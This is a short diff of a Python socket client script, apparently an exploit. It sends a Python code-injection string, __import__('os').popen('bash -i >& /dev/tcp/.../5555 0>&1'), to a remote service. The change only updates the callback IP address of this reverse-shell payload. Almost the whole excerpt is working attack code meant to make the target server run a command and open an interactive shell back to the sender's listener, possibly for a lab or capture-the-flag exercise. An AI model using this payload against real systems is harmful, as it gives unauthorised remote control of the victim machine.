@@ -11,7 +11,7 @@ try:
     s.connect((host, port))
     s.send("Ok".encode())
     data = s.recv(1024)
-    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.33.73.72/5555 0>&1').read()"
+    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.33.49.124/5555 0>&1').read()"
     s.send(userMessage.encode("utf-8"))
     data = s.recv(1024)
     s.close()
